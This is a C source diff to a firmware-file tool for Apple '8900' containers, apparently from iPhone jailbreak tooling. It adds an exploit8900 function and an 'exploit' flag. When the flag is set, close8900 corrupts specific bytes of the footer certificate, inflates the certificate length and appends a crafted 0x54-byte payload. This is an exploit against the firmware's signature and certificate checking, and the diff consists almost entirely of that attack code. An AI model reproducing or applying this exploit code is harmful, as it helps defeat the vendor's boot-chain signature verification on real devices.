@@ -101,7 +101,24 @@ void close8900(AbstractFile* file) {
 		info->file->seek(info->file, sizeof(info->header) + info->header.footerSignatureOffset);
 		info->file->write(info->file, info->footerSignature, 0x80);
 		info->file->seek(info->file, sizeof(info->header) + info->header.footerCertOffset);
+
+		if(info->exploit) {
+			info->footerCertificate[0x8be] = 0x9F;
+			info->footerCertificate[0xb08] = 0x55;
+		}
+
 		info->file->write(info->file, info->footerCertificate, info->header.footerCertLen);
+
+		unsigned char exploit_data[0x54] = {0};
+
+		if(info->exploit) {
+			info->header.footerCertLen = 0xc5e;
+			exploit_data[0x30] = 0x01;
+			exploit_data[0x50] = 0xEC;
+			exploit_data[0x51] = 0x57;
+			exploit_data[0x53] = 0x20;
+			info->file->write(info->file, exploit_data, sizeof(exploit_data));
+		}
 		
 		flipApple8900Header(&(info->header));
 		SHA1_Init(&sha_ctx);
@@ -122,6 +139,11 @@ void close8900(AbstractFile* file) {
 	free(file);
 }
 
+void exploit8900(AbstractFile* file) {
+	Info8900* info = (Info8900*) (file->data);
+	info->exploit = TRUE;
+	info->dirty = TRUE;
+}
 
 AbstractFile* createAbstractFileFrom8900(AbstractFile* file) {
 	Info8900* info;
@@ -154,6 +176,7 @@ AbstractFile* createAbstractFileFrom8900(AbstractFile* file) {
 	}
 
 	info->dirty = FALSE;
+	info->exploit = FALSE;
 	
 	info->offset = 0;
 	
